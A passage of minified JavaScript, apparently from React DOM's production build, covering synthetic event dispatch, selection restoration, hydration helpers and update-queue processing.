  return t && (("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type)) || "textarea" === t || "true" === e.contentEditable);
}
function mo(e) {
  var t = po(),
      n = e.focusedElem,
      r = e.selectionRange;
  if (t !== n && n && n.ownerDocument && fo(n.ownerDocument.documentElement, n)) {
      if (null !== r && ho(n))
          if (((t = r.start), void 0 === (e = r.end) && (e = t), "selectionStart" in n)) (n.selectionStart = t), (n.selectionEnd = Math.min(e, n.value.length));
          else if ((e = ((t = n.ownerDocument || document) && t.defaultView) || window).getSelection) {
              e = e.getSelection();
              var o = n.textContent.length,
                  a = Math.min(r.start, o);
              (r = void 0 === r.end ? a : Math.min(r.end, o)), !e.extend && a > r && ((o = r), (r = a), (a = o)), (o = uo(n, a));
              var i = uo(n, r);
              o &&
                  i &&
                  (1 !== e.rangeCount || e.anchorNode !== o.node || e.anchorOffset !== o.offset || e.focusNode !== i.node || e.focusOffset !== i.offset) &&
                  ((t = t.createRange()).setStart(o.node, o.offset), e.removeAllRanges(), a > r ? (e.addRange(t), e.extend(i.node, i.offset)) : (t.setEnd(i.node, i.offset), e.addRange(t)));
          }
      for (t = [], e = n; (e = e.parentNode); ) 1 === e.nodeType && t.push({ element: e, left: e.scrollLeft, top: e.scrollTop });
      for ("function" == typeof n.focus && n.focus(), n = 0; n < t.length; n++) ((e = t[n]).element.scrollLeft = e.left), (e.element.scrollTop = e.top);
  }
}
var go = ue && "documentMode" in document && 11 >= document.documentMode,
  vo = null,
  yo = null,
  bo = null,
  xo = !1;
function wo(e, t, n) {
  var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
  xo ||
      null == vo ||
      vo !== Xe(r) ||
      ("selectionStart" in (r = vo) && ho(r)
          ? (r = { start: r.selectionStart, end: r.selectionEnd })
          : (r = { anchorNode: (r = ((r.ownerDocument && r.ownerDocument.defaultView) || window).getSelection()).anchorNode, anchorOffset: r.anchorOffset, focusNode: r.focusNode, focusOffset: r.focusOffset }),
      (bo && lo(bo, r)) || ((bo = r), 0 < (r = Yo(yo, "onSelect")).length && ((t = new ur("onSelect", "select", null, t, n)), e.push({ event: t, listeners: r }), (t.target = vo))));
}
function So(e, t) {
  var n = {};
  return (n[e.toLowerCase()] = t.toLowerCase()), (n["Webkit" + e] = "webkit" + t), (n["Moz" + e] = "moz" + t), n;
}
var ko = { animationend: So("Animation", "AnimationEnd"), animationiteration: So("Animation", "AnimationIteration"), animationstart: So("Animation", "AnimationStart"), transitionend: So("Transition", "TransitionEnd") },
  Eo = {},
  Co = {};
function _o(e) {
  if (Eo[e]) return Eo[e];
  if (!ko[e]) return e;
  var t,
      n = ko[e];
  for (t in n) if (n.hasOwnProperty(t) && t in Co) return (Eo[e] = n[t]);
  return e;
}
ue &&
  ((Co = document.createElement("div").style),
  "AnimationEvent" in window || (delete ko.animationend.animation, delete ko.animationiteration.animation, delete ko.animationstart.animation),
  "TransitionEvent" in window || delete ko.transitionend.transition);
var Po = _o("animationend"),
  To = _o("animationiteration"),
  Ro = _o("animationstart"),
  zo = _o("transitionend"),
  Ao = new Map(),
  jo = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
      " "
  );
function Oo(e, t) {
  Ao.set(e, t), le(t, [e]);
}
for (var Fo = 0; Fo < jo.length; Fo++) {
  var No = jo[Fo];
  Oo(No.toLowerCase(), "on" + (No[0].toUpperCase() + No.slice(1)));
}
Oo(Po, "onAnimationEnd"),
  Oo(To, "onAnimationIteration"),
  Oo(Ro, "onAnimationStart"),
  Oo("dblclick", "onDoubleClick"),
  Oo("focusin", "onFocus"),
  Oo("focusout", "onBlur"),
  Oo(zo, "onTransitionEnd"),
  ce("onMouseEnter", ["mouseout", "mouseover"]),
  ce("onMouseLeave", ["mouseout", "mouseover"]),
  ce("onPointerEnter", ["pointerout", "pointerover"]),
  ce("onPointerLeave", ["pointerout", "pointerover"]),
  le("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
  le("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
  le("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
  le("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
  le("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
  le("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var Mo = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
      " "
  ),
  Lo = new Set("cancel close invalid load scroll toggle".split(" ").concat(Mo));
function Bo(e, t, n) {
  var r = e.type || "unknown-event";
  (e.currentTarget = n),
      (function (e, t, n, r, o, a, i, s, l) {
          if (($t.apply(this, arguments), Mt)) {
              if (!Mt) throw Error(ae(198));
              var c = Lt;
              (Mt = !1), (Lt = null), Bt || ((Bt = !0), (It = c));
          }
      })(r, t, void 0, e),
      (e.currentTarget = null);
}
function Io(e, t) {
  t = 0 != (4 & t);
  for (var n = 0; n < e.length; n++) {
      var r = e[n],
          o = r.event;
      r = r.listeners;
      e: {
          var a = void 0;
          if (t)
              for (var i = r.length - 1; 0 <= i; i--) {
                  var s = r[i],
                      l = s.instance,
                      c = s.currentTarget;
                  if (((s = s.listener), l !== a && o.isPropagationStopped())) break e;
                  Bo(o, s, c), (a = l);
              }
          else
              for (i = 0; i < r.length; i++) {
                  if (((l = (s = r[i]).instance), (c = s.currentTarget), (s = s.listener), l !== a && o.isPropagationStopped())) break e;
                  Bo(o, s, c), (a = l);
              }
      }
  }
  if (Bt) throw ((e = It), (Bt = !1), (It = null), e);
}
function Do(e, t) {
  var n = t[ga];
  void 0 === n && (n = t[ga] = new Set());
  var r = e + "__bubble";
  n.has(r) || (Wo(t, e, 2, !1), n.add(r));
}
function $o(e, t, n) {
  var r = 0;
  t && (r |= 4), Wo(n, e, r, t);
}
var Vo = "_reactListening" + Math.random().toString(36).slice(2);
function Uo(e) {
  if (!e[Vo]) {
      (e[Vo] = !0),
          ie.forEach(function (t) {
              "selectionchange" !== t && (Lo.has(t) || $o(t, !1, e), $o(t, !0, e));
          });
      var t = 9 === e.nodeType ? e : e.ownerDocument;
      null === t || t[Vo] || ((t[Vo] = !0), $o("selectionchange", !1, t));
  }
}
function Wo(e, t, n, r) {
  switch (Kn(t)) {
      case 1:
          var o = qn;
          break;
      case 4:
          o = Yn;
          break;
      default:
          o = Xn;
  }
  (n = o.bind(null, t, n, e)),
      (o = void 0),
      !Ot || ("touchstart" !== t && "touchmove" !== t && "wheel" !== t) || (o = !0),
      r ? (void 0 !== o ? e.addEventListener(t, n, { capture: !0, passive: o }) : e.addEventListener(t, n, !0)) : void 0 !== o ? e.addEventListener(t, n, { passive: o }) : e.addEventListener(t, n, !1);
}
function Ho(e, t, n, r, o) {
  var a = r;
  if (0 == (1 & t) && 0 == (2 & t) && null !== r)
      e: for (;;) {
          if (null === r) return;
          var i = r.tag;
          if (3 === i || 4 === i) {
              var s = r.stateNode.containerInfo;
              if (s === o || (8 === s.nodeType && s.parentNode === o)) break;
              if (4 === i)
                  for (i = r.return; null !== i; ) {
                      var l = i.tag;
                      if ((3 === l || 4 === l) && ((l = i.stateNode.containerInfo) === o || (8 === l.nodeType && l.parentNode === o))) return;
                      i = i.return;
                  }
              for (; null !== s; ) {
                  if (null === (i = ba(s))) return;
                  if (5 === (l = i.tag) || 6 === l) {
                      r = a = i;
                      continue e;
                  }
                  s = s.parentNode;
              }
          }
          r = r.return;
      }
  At(function () {
      var r = a,
          o = wt(n),
          i = [];
      e: {
          var s = Ao.get(e);
          if (void 0 !== s) {
              var l = ur,
                  c = e;
              switch (e) {
                  case "keypress":
                      if (0 === nr(n)) break e;
                  case "keydown":
                  case "keyup":
                      l = Pr;
                      break;
                  case "focusin":
                      (c = "focus"), (l = gr);
                      break;
                  case "focusout":
                      (c = "blur"), (l = gr);
                      break;
                  case "beforeblur":
                  case "afterblur":
                      l = gr;
                      break;
                  case "click":
                      if (2 === n.button) break e;
                  case "auxclick":
                  case "dblclick":
                  case "mousedown":
                  case "mousemove":
                  case "mouseup":
                  case "mouseout":
                  case "mouseover":
                  case "contextmenu":
                      l = hr;
                      break;
                  case "drag":
                  case "dragend":
                  case "dragenter":
                  case "dragexit":
                  case "dragleave":
                  case "dragover":
                  case "dragstart":
                  case "drop":
                      l = mr;
                      break;
                  case "touchcancel":
                  case "touchend":
                  case "touchmove":
                  case "touchstart":
                      l = Rr;
                      break;
                  case Po:
                  case To:
                  case Ro:
                      l = vr;
                      break;
                  case zo:
                      l = zr;
                      break;
                  case "scroll":
                      l = fr;
                      break;
                  case "wheel":
                      l = jr;
                      break;
                  case "copy":
                  case "cut":
                  case "paste":
                      l = br;
                      break;
                  case "gotpointercapture":
                  case "lostpointercapture":
                  case "pointercancel":
                  case "pointerdown":
                  case "pointermove":
                  case "pointerout":
                  case "pointerover":
                  case "pointerup":
                      l = Tr;
              }
              var u = 0 != (4 & t),
                  d = !u && "scroll" === e,
                  f = u ? (null !== s ? s + "Capture" : null) : s;
              u = [];
              for (var p, h = r; null !== h; ) {
                  var m = (p = h).stateNode;
                  if ((5 === p.tag && null !== m && ((p = m), null !== f && null != (m = jt(h, f)) && u.push(qo(h, m, p))), d)) break;
                  h = h.return;
              }
              0 < u.length && ((s = new l(s, c, null, n, o)), i.push({ event: s, listeners: u }));
          }
      }
      if (0 == (7 & t)) {
          if (
              ((l = "mouseout" === e || "pointerout" === e),
              (!(s = "mouseover" === e || "pointerover" === e) || n === xt || !(c = n.relatedTarget || n.fromElement) || (!ba(c) && !c[ma])) &&
                  (l || s) &&
                  ((s = o.window === o ? o : (s = o.ownerDocument) ? s.defaultView || s.parentWindow : window),
                  l ? ((l = r), null !== (c = (c = n.relatedTarget || n.toElement) ? ba(c) : null) && (c !== (d = Vt(c)) || (5 !== c.tag && 6 !== c.tag)) && (c = null)) : ((l = null), (c = r)),
                  l !== c))
          ) {
              if (
                  ((u = hr),
                  (m = "onMouseLeave"),
                  (f = "onMouseEnter"),
                  (h = "mouse"),
                  ("pointerout" !== e && "pointerover" !== e) || ((u = Tr), (m = "onPointerLeave"), (f = "onPointerEnter"), (h = "pointer")),
                  (d = null == l ? s : wa(l)),
                  (p = null == c ? s : wa(c)),
                  ((s = new u(m, h + "leave", l, n, o)).target = d),
                  (s.relatedTarget = p),
                  (m = null),
                  ba(o) === r && (((u = new u(f, h + "enter", c, n, o)).target = p), (u.relatedTarget = d), (m = u)),
                  (d = m),
                  l && c)
              )
                  e: {
                      for (f = c, h = 0, p = u = l; p; p = Xo(p)) h++;
                      for (p = 0, m = f; m; m = Xo(m)) p++;
                      for (; 0 < h - p; ) (u = Xo(u)), h--;
                      for (; 0 < p - h; ) (f = Xo(f)), p--;
                      for (; h--; ) {
                          if (u === f || (null !== f && u === f.alternate)) break e;
                          (u = Xo(u)), (f = Xo(f));
                      }
                      u = null;
                  }
              else u = null;
              null !== l && Go(i, s, l, u, !1), null !== c && null !== d && Go(i, d, c, u, !0);
          }
          if ("select" === (l = (s = r ? wa(r) : window).nodeName && s.nodeName.toLowerCase()) || ("input" === l && "file" === s.type)) var g = Qr;
          else if (Wr(s))
              if (Kr) g = io;
              else {
                  g = oo;
                  var v = ro;
              }
          else (l = s.nodeName) && "input" === l.toLowerCase() && ("checkbox" === s.type || "radio" === s.type) && (g = ao);
          switch ((g && (g = g(e, r)) ? Hr(i, g, n, o) : (v && v(e, s, r), "focusout" === e && (v = s._wrapperState) && v.controlled && "number" === s.type && et(s, "number", s.value)), (v = r ? wa(r) : window), e)) {
              case "focusin":
                  (Wr(v) || "true" === v.contentEditable) && ((vo = v), (yo = r), (bo = null));
                  break;
              case "focusout":
                  bo = yo = vo = null;
                  break;
              case "mousedown":
                  xo = !0;
                  break;
              case "contextmenu":
              case "mouseup":
              case "dragend":
                  (xo = !1), wo(i, n, o);
                  break;
              case "selectionchange":
                  if (go) break;
              case "keydown":
              case "keyup":
                  wo(i, n, o);
          }
          var y;
          if (Fr)
              e: {
                  switch (e) {
                      case "compositionstart":
                          var b = "onCompositionStart";
                          break e;
                      case "compositionend":
                          b = "onCompositionEnd";
                          break e;
                      case "compositionupdate":
                          b = "onCompositionUpdate";
                          break e;
                  }
                  b = void 0;
              }
          else Vr ? Dr(e, n) && (b = "onCompositionEnd") : "keydown" === e && 229 === n.keyCode && (b = "onCompositionStart");
          b &&
              (Lr && "ko" !== n.locale && (Vr || "onCompositionStart" !== b ? "onCompositionEnd" === b && Vr && (y = tr()) : ((Jn = "value" in (Zn = o) ? Zn.value : Zn.textContent), (Vr = !0))),
              0 < (v = Yo(r, b)).length && ((b = new xr(b, e, null, n, o)), i.push({ event: b, listeners: v }), y ? (b.data = y) : null !== (y = $r(n)) && (b.data = y))),
              (y = Mr
                  ? (function (e, t) {
                        switch (e) {
                            case "compositionend":
                                return $r(t);
                            case "keypress":
                                return 32 !== t.which ? null : ((Ir = !0), Br);
                            case "textInput":
                                return (e = t.data) === Br && Ir ? null : e;
                            default:
                                return null;
                        }
                    })(e, n)
                  : (function (e, t) {
                        if (Vr) return "compositionend" === e || (!Fr && Dr(e, t)) ? ((e = tr()), (er = Jn = Zn = null), (Vr = !1), e) : null;
                        switch (e) {
                            case "paste":
                            default:
                                return null;
                            case "keypress":
                                if (!(t.ctrlKey || t.altKey || t.metaKey) || (t.ctrlKey && t.altKey)) {
                                    if (t.char && 1 < t.char.length) return t.char;
                                    if (t.which) return String.fromCharCode(t.which);
                                }
                                return null;
                            case "compositionend":
                                return Lr && "ko" !== t.locale ? null : t.data;
                        }
                    })(e, n)) &&
                  0 < (r = Yo(r, "onBeforeInput")).length &&
                  ((o = new xr("onBeforeInput", "beforeinput", null, n, o)), i.push({ event: o, listeners: r }), (o.data = y));
      }
      Io(i, t);
  });
}
function qo(e, t, n) {
  return { instance: e, listener: t, currentTarget: n };
}
function Yo(e, t) {
  for (var n = t + "Capture", r = []; null !== e; ) {
      var o = e,
          a = o.stateNode;
      5 === o.tag && null !== a && ((o = a), null != (a = jt(e, n)) && r.unshift(qo(e, a, o)), null != (a = jt(e, t)) && r.push(qo(e, a, o))), (e = e.return);
  }
  return r;
}
function Xo(e) {
  if (null === e) return null;
  do {
      e = e.return;
  } while (e && 5 !== e.tag);
  return e || null;
}
function Go(e, t, n, r, o) {
  for (var a = t._reactName, i = []; null !== n && n !== r; ) {
      var s = n,
          l = s.alternate,
          c = s.stateNode;
      if (null !== l && l === r) break;
      5 === s.tag && null !== c && ((s = c), o ? null != (l = jt(n, a)) && i.unshift(qo(n, l, s)) : o || (null != (l = jt(n, a)) && i.push(qo(n, l, s)))), (n = n.return);
  }
  0 !== i.length && e.push({ event: t, listeners: i });
}
var Qo = /\r\n?/g,
  Ko = /\u0000|\uFFFD/g;
function Zo(e) {
  return ("string" == typeof e ? e : "" + e).replace(Qo, "\n").replace(Ko, "");
}
function Jo(e, t, n) {
  if (((t = Zo(t)), Zo(e) !== t && n)) throw Error(ae(425));
}
function ea() {}
var ta = null,
  na = null;
function ra(e, t) {
  return (
      "textarea" === e ||
      "noscript" === e ||
      "string" == typeof t.children ||
      "number" == typeof t.children ||
      ("object" == typeof t.dangerouslySetInnerHTML && null !== t.dangerouslySetInnerHTML && null != t.dangerouslySetInnerHTML.__html)
  );
}
var oa = "function" == typeof setTimeout ? setTimeout : void 0,
  aa = "function" == typeof clearTimeout ? clearTimeout : void 0,
  ia = "function" == typeof Promise ? Promise : void 0,
  sa =
      "function" == typeof queueMicrotask
          ? queueMicrotask
          : void 0 !== ia
          ? function (e) {
                return ia.resolve(null).then(e).catch(la);
            }
          : oa;
function la(e) {
  setTimeout(function () {
      throw e;
  });
}
function ca(e, t) {
  var n = t,
      r = 0;
  do {
      var o = n.nextSibling;
      if ((e.removeChild(n), o && 8 === o.nodeType))
          if ("/$" === (n = o.data)) {
              if (0 === r) return e.removeChild(o), void Un(t);
              r--;
          } else ("$" !== n && "$?" !== n && "$!" !== n) || r++;
      n = o;
  } while (n);
  Un(t);
}
function ua(e) {
  for (; null != e; e = e.nextSibling) {
      var t = e.nodeType;
      if (1 === t || 3 === t) break;
      if (8 === t) {
          if ("$" === (t = e.data) || "$!" === t || "$?" === t) break;
          if ("/$" === t) return null;
      }
  }
  return e;
}
function da(e) {
  e = e.previousSibling;
  for (var t = 0; e; ) {
      if (8 === e.nodeType) {
          var n = e.data;
          if ("$" === n || "$!" === n || "$?" === n) {
              if (0 === t) return e;
              t--;
          } else "/$" === n && t++;
      }
      e = e.previousSibling;
  }
  return null;
}
var fa = Math.random().toString(36).slice(2),
  pa = "__reactFiber$" + fa,
  ha = "__reactProps$" + fa,
  ma = "__reactContainer$" + fa,
  ga = "__reactEvents$" + fa,
  va = "__reactListeners$" + fa,
  ya = "__reactHandles$" + fa;
function ba(e) {
  var t = e[pa];
  if (t) return t;
  for (var n = e.parentNode; n; ) {
      if ((t = n[ma] || n[pa])) {
          if (((n = t.alternate), null !== t.child || (null !== n && null !== n.child)))
              for (e = da(e); null !== e; ) {
                  if ((n = e[pa])) return n;
                  e = da(e);
              }
          return t;
      }
      n = (e = n).parentNode;
  }
  return null;
}
function xa(e) {
  return !(e = e[pa] || e[ma]) || (5 !== e.tag && 6 !== e.tag && 13 !== e.tag && 3 !== e.tag) ? null : e;
}
function wa(e) {
  if (5 === e.tag || 6 === e.tag) return e.stateNode;
  throw Error(ae(33));
}
function Sa(e) {
  return e[ha] || null;
}
var ka = [],
  Ea = -1;
function Ca(e) {
  return { current: e };
}
function _a(e) {
  0 > Ea || ((e.current = ka[Ea]), (ka[Ea] = null), Ea--);
}
function Pa(e, t) {
  Ea++, (ka[Ea] = e.current), (e.current = t);
}
var Ta = {},
  Ra = Ca(Ta),
  za = Ca(!1),
  Aa = Ta;
function ja(e, t) {
  var n = e.type.contextTypes;
  if (!n) return Ta;
  var r = e.stateNode;
  if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
  var o,
      a = {};
  for (o in n) a[o] = t[o];
  return r && (((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = t), (e.__reactInternalMemoizedMaskedChildContext = a)), a;
}
function Oa(e) {
  return null != (e = e.childContextTypes);
}
function Fa() {
  _a(za), _a(Ra);
}
function Na(e, t, n) {
  if (Ra.current !== Ta) throw Error(ae(168));
  Pa(Ra, t), Pa(za, n);
}
function Ma(e, t, n) {
  var r = e.stateNode;
  if (((t = t.childContextTypes), "function" != typeof r.getChildContext)) return n;
  for (var o in (r = r.getChildContext())) if (!(o in t)) throw Error(ae(108, Ue(e) || "Unknown", o));
  return Le({}, n, r);
}
function La(e) {
  return (e = ((e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext) || Ta), (Aa = Ra.current), Pa(Ra, e), Pa(za, za.current), !0;
}
function Ba(e, t, n) {
  var r = e.stateNode;
  if (!r) throw Error(ae(169));
  n ? ((e = Ma(e, t, Aa)), (r.__reactInternalMemoizedMergedChildContext = e), _a(za), _a(Ra), Pa(Ra, e)) : _a(za), Pa(za, n);
}
var Ia = null,
  Da = !1,
  $a = !1;
function Va(e) {
  null === Ia ? (Ia = [e]) : Ia.push(e);
}
function Ua() {
  if (!$a && null !== Ia) {
      $a = !0;
      var e = 0,
          t = xn;
      try {
          var n = Ia;
          for (xn = 1; e < n.length; e++) {
              var r = n[e];
              do {
                  r = r(!0);
              } while (null !== r);
          }
          (Ia = null), (Da = !1);
      } catch (gF) {
          throw (null !== Ia && (Ia = Ia.slice(e + 1)), Yt(Jt, Ua), gF);
      } finally {
          (xn = t), ($a = !1);
      }
  }
  return null;
}
var Wa = [],
  Ha = 0,
  qa = null,
  Ya = 0,
  Xa = [],
  Ga = 0,
  Qa = null,
  Ka = 1,
  Za = "";
function Ja(e, t) {
  (Wa[Ha++] = Ya), (Wa[Ha++] = qa), (qa = e), (Ya = t);
}
function ei(e, t, n) {
  (Xa[Ga++] = Ka), (Xa[Ga++] = Za), (Xa[Ga++] = Qa), (Qa = e);
  var r = Ka;
  e = Za;
  var o = 32 - sn(r) - 1;
  (r &= ~(1 << o)), (n += 1);
  var a = 32 - sn(t) + o;
  if (30 < a) {
      var i = o - (o % 5);
      (a = (r & ((1 << i) - 1)).toString(32)), (r >>= i), (o -= i), (Ka = (1 << (32 - sn(t) + o)) | (n << o) | r), (Za = a + e);
  } else (Ka = (1 << a) | (n << o) | r), (Za = e);
}
function ti(e) {
  null !== e.return && (Ja(e, 1), ei(e, 1, 0));
}
function ni(e) {
  for (; e === qa; ) (qa = Wa[--Ha]), (Wa[Ha] = null), (Ya = Wa[--Ha]), (Wa[Ha] = null);
  for (; e === Qa; ) (Qa = Xa[--Ga]), (Xa[Ga] = null), (Za = Xa[--Ga]), (Xa[Ga] = null), (Ka = Xa[--Ga]), (Xa[Ga] = null);
}
var ri = null,
  oi = null,
  ai = !1,
  ii = null;
function si(e, t) {
  var n = Au(5, null, null, 0);
  (n.elementType = "DELETED"), (n.stateNode = t), (n.return = e), null === (t = e.deletions) ? ((e.deletions = [n]), (e.flags |= 16)) : t.push(n);
}
function li(e, t) {
  switch (e.tag) {
      case 5:
          var n = e.type;
          return null !== (t = 1 !== t.nodeType || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t) && ((e.stateNode = t), (ri = e), (oi = ua(t.firstChild)), !0);
      case 6:
          return null !== (t = "" === e.pendingProps || 3 !== t.nodeType ? null : t) && ((e.stateNode = t), (ri = e), (oi = null), !0);
      case 13:
          return (
              null !== (t = 8 !== t.nodeType ? null : t) &&
              ((n = null !== Qa ? { id: Ka, overflow: Za } : null),
              (e.memoizedState = { dehydrated: t, treeContext: n, retryLane: 1073741824 }),
              ((n = Au(18, null, null, 0)).stateNode = t),
              (n.return = e),
              (e.child = n),
              (ri = e),
              (oi = null),
              !0)
          );
      default:
          return !1;
  }
}
function ci(e) {
  return 0 != (1 & e.mode) && 0 == (128 & e.flags);
}
function ui(e) {
  if (ai) {
      var t = oi;
      if (t) {
          var n = t;
          if (!li(e, t)) {
              if (ci(e)) throw Error(ae(418));
              t = ua(n.nextSibling);
              var r = ri;
              t && li(e, t) ? si(r, n) : ((e.flags = (-4097 & e.flags) | 2), (ai = !1), (ri = e));
          }
      } else {
          if (ci(e)) throw Error(ae(418));
          (e.flags = (-4097 & e.flags) | 2), (ai = !1), (ri = e);
      }
  }
}
function di(e) {
  for (e = e.return; null !== e && 5 !== e.tag && 3 !== e.tag && 13 !== e.tag; ) e = e.return;
  ri = e;
}
function fi(e) {
  if (e !== ri) return !1;
  if (!ai) return di(e), (ai = !0), !1;
  var t;
  if (((t = 3 !== e.tag) && !(t = 5 !== e.tag) && (t = "head" !== (t = e.type) && "body" !== t && !ra(e.type, e.memoizedProps)), t && (t = oi))) {
      if (ci(e)) throw (pi(), Error(ae(418)));
      for (; t; ) si(e, t), (t = ua(t.nextSibling));
  }
  if ((di(e), 13 === e.tag)) {
      if (!(e = null !== (e = e.memoizedState) ? e.dehydrated : null)) throw Error(ae(317));
      e: {
          for (e = e.nextSibling, t = 0; e; ) {
              if (8 === e.nodeType) {
                  var n = e.data;
                  if ("/$" === n) {
                      if (0 === t) {
                          oi = ua(e.nextSibling);
                          break e;
                      }
                      t--;
                  } else ("$" !== n && "$!" !== n && "$?" !== n) || t++;
              }
              e = e.nextSibling;
          }
          oi = null;
      }
  } else oi = ri ? ua(e.stateNode.nextSibling) : null;
  return !0;
}
function pi() {
  for (var e = oi; e; ) e = ua(e.nextSibling);
}
function hi() {
  (oi = ri = null), (ai = !1);
}
function mi(e) {
  null === ii ? (ii = [e]) : ii.push(e);
}
var gi = xe.ReactCurrentBatchConfig;
function vi(e, t) {
  if (e && e.defaultProps) {
      for (var n in ((t = Le({}, t)), (e = e.defaultProps))) void 0 === t[n] && (t[n] = e[n]);
      return t;
  }
  return t;
}
var yi = Ca(null),
  bi = null,
  xi = null,
  wi = null;
function Si() {
  wi = xi = bi = null;
}
function ki(e) {
  var t = yi.current;
  _a(yi), (e._currentValue = t);
}
function Ei(e, t, n) {
  for (; null !== e; ) {
      var r = e.alternate;
      if (((e.childLanes & t) !== t ? ((e.childLanes |= t), null !== r && (r.childLanes |= t)) : null !== r && (r.childLanes & t) !== t && (r.childLanes |= t), e === n)) break;
      e = e.return;
  }
}
function Ci(e, t) {
  (bi = e), (wi = xi = null), null !== (e = e.dependencies) && null !== e.firstContext && (0 != (e.lanes & t) && (bl = !0), (e.firstContext = null));
}
function _i(e) {
  var t = e._currentValue;
  if (wi !== e)
      if (((e = { context: e, memoizedValue: t, next: null }), null === xi)) {
          if (null === bi) throw Error(ae(308));
          (xi = e), (bi.dependencies = { lanes: 0, firstContext: e });
      } else xi = xi.next = e;
  return t;
}
var Pi = null;
function Ti(e) {
  null === Pi ? (Pi = [e]) : Pi.push(e);
}
function Ri(e, t, n, r) {
  var o = t.interleaved;
  return null === o ? ((n.next = n), Ti(t)) : ((n.next = o.next), (o.next = n)), (t.interleaved = n), zi(e, r);
}
function zi(e, t) {
  e.lanes |= t;
  var n = e.alternate;
  for (null !== n && (n.lanes |= t), n = e, e = e.return; null !== e; ) (e.childLanes |= t), null !== (n = e.alternate) && (n.childLanes |= t), (n = e), (e = e.return);
  return 3 === n.tag ? n.stateNode : null;
}
var Ai = !1;
function ji(e) {
  e.updateQueue = { baseState: e.memoizedState, firstBaseUpdate: null, lastBaseUpdate: null, shared: { pending: null, interleaved: null, lanes: 0 }, effects: null };
}
function Oi(e, t) {
  (e = e.updateQueue), t.updateQueue === e && (t.updateQueue = { baseState: e.baseState, firstBaseUpdate: e.firstBaseUpdate, lastBaseUpdate: e.lastBaseUpdate, shared: e.shared, effects: e.effects });
}
function Fi(e, t) {
  return { eventTime: e, lane: t, tag: 0, payload: null, callback: null, next: null };
}
function Ni(e, t, n) {
  var r = e.updateQueue;
  if (null === r) return null;
  if (((r = r.shared), 0 != (2 & Tc))) {
      var o = r.pending;
      return null === o ? (t.next = t) : ((t.next = o.next), (o.next = t)), (r.pending = t), zi(e, n);
  }
  return null === (o = r.interleaved) ? ((t.next = t), Ti(r)) : ((t.next = o.next), (o.next = t)), (r.interleaved = t), zi(e, n);
}
function Mi(e, t, n) {
  if (null !== (t = t.updateQueue) && ((t = t.shared), 0 != (4194240 & n))) {
      var r = t.lanes;
      (n |= r &= e.pendingLanes), (t.lanes = n), bn(e, n);
  }
}
function Li(e, t) {
  var n = e.updateQueue,
      r = e.alternate;
  if (null !== r && n === (r = r.updateQueue)) {
      var o = null,
          a = null;
      if (null !== (n = n.firstBaseUpdate)) {
          do {
              var i = { eventTime: n.eventTime, lane: n.lane, tag: n.tag, payload: n.payload, callback: n.callback, next: null };
              null === a ? (o = a = i) : (a = a.next = i), (n = n.next);
          } while (null !== n);
          null === a ? (o = a = t) : (a = a.next = t);
      } else o = a = t;
      return (n = { baseState: r.baseState, firstBaseUpdate: o, lastBaseUpdate: a, shared: r.shared, effects: r.effects }), void (e.updateQueue = n);
  }
  null === (e = n.lastBaseUpdate) ? (n.firstBaseUpdate = t) : (e.next = t), (n.lastBaseUpdate = t);
}
function Bi(e, t, n, r) {
  var o = e.updateQueue;
  Ai = !1;
  var a = o.firstBaseUpdate,
      i = o.lastBaseUpdate,
      s = o.shared.pending;
  if (null !== s) {
      o.shared.pending = null;
      var l = s,
          c = l.next;
      (l.next = null), null === i ? (a = c) : (i.next = c), (i = l);
      var u = e.alternate;
      null !== u && (s = (u = u.updateQueue).lastBaseUpdate) !== i && (null === s ? (u.firstBaseUpdate = c) : (s.next = c), (u.lastBaseUpdate = l));
  }
  if (null !== a) {
      var d = o.baseState;
      for (i = 0, u = c = l = null, s = a; ; ) {
          var f = s.lane,
              p = s.eventTime;
          if ((r & f) === f) {
              null !== u && (u = u.next = { eventTime: p, lane: 0, tag: s.tag, payload: s.payload, callback: s.callback, next: null });
              e: {
                  var h = e,
                      m = s;
                  switch (((f = t), (p = n), m.tag)) {
                      case 1:
                          if ("function" == typeof (h = m.payload)) {
                              d = h.call(p, d, f);
                              break e;
                          }
                          d = h;
                          break e;
                      case 3:
                          h.flags = (-65537 & h.flags) | 128;
                      case 0:
                          if (null == (f = "function" == typeof (h = m.payload) ? h.call(p, d, f) : h)) break e;
                          d = Le({}, d, f);
                          break e;
                      case 2:
                          Ai = !0;
                  }
              }
              null !== s.callback && 0 !== s.lane && ((e.flags |= 64), null === (f = o.effects) ? (o.effects = [s]) : f.push(s));
          } else (p = { eventTime: p, lane: f, tag: s.tag, payload: s.payload, callback: s.callback, next: null }), null === u ? ((c = u = p), (l = d)) : (u = u.next = p), (i |= f);
          if (null === (s = s.next)) {
              if (null === (s = o.shared.pending)) break;
              (s = (f = s).next), (f.next = null), (o.lastBaseUpdate = f), (o.shared.pending = null);
          }
      }
      if ((null === u && (l = d), (o.baseState = l), (o.firstBaseUpdate = c), (o.lastBaseUpdate = u), null !== (t = o.shared.interleaved))) {
          o = t;
          do {
              (i |= o.lane), (o = o.next);
          } while (o !== t);
      } else null === a && (o.shared.lanes = 0);
      (Mc |= i), (e.lanes = i), (e.memoizedState = d);
  }
}
function Ii(e, t, n) {
